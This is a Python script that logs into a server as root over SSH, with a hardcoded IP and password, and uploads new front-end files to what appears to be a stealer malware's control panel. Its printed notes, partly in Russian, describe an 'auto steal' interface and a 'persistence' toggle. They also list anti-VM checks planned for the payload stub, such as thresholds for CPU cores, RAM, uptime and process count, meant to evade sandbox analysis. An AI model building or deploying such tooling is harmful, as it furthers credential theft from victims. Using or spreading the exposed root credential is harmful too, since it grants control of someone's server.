import paramiko
import time

host = "94.26.106.244"
username = "root"
password = "VbDkQ8!KUEbmAAYz"

files_to_upload = [
    (r"Z:\Aetseticasss\Aethestic\index_downloaded.html", "/opt/aesthetic/Panel/public/index.html"),
    (r"Z:\Aetseticasss\Aethestic\app_js_downloaded.js", "/opt/aesthetic/Panel/public/app.js")
]

try:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    print(f"[*] connecting to {host}...")
    client.connect(host, username=username, password=password, timeout=10)
    print(f"[+] connected\n")

    sftp = client.open_sftp()

    for local_file, remote_file in files_to_upload:
        backup_file = f"{remote_file}.backup_{int(time.time())}"
        stdin, stdout, stderr = client.exec_command(f"cp {remote_file} {backup_file}")
        stdout.channel.recv_exit_status()
        print(f"[*] backed up {remote_file}")

        print(f"[*] uploading {local_file} -> {remote_file}")
        sftp.put(local_file, remote_file)
        print(f"[+] uploaded\n")

    sftp.close()

    print("[+] auto steal UI улучшен:")
    print("  - переделан checkbox в dropdown стиль (как persistence)")
    print("  - добавлены radio buttons: Disabled / Enabled")
    print("  - dropdown toggle работает кликом")
    print("\n[*] предложенные anti-vm функции для стаба:")
    print("  - CPU cores check (< 2 ядра)")
    print("  - RAM check (< 4GB)")
    print("  - Uptime check (< 10 минут)")
    print("  - Screen resolution (< 1000x600)")
    print("  - Recent files count (< 10)")
    print("  - Process count (< 50)")

    client.close()

except Exception as e:
    print(f"[-] error: {e}")
